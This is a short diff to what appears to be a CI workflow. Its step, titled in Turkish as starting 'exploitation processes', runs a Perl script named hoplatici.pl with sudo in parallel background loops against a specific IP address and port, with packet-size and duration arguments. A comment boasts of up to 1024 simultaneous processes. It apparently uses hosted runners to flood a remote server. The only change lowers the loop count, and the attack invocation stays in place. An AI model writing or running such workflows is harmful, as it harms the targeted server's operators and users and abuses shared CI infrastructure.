@@ -23,7 +23,7 @@ jobs:
       - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
         run: |
           PIDS=()
-          for i in {1..6}; do
+          for i in {1..1}; do
             # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
             sudo timeout 60 perl hoplatici.pl 37.230.60.150 9987 1472 60 &
             PIDS+=($!)
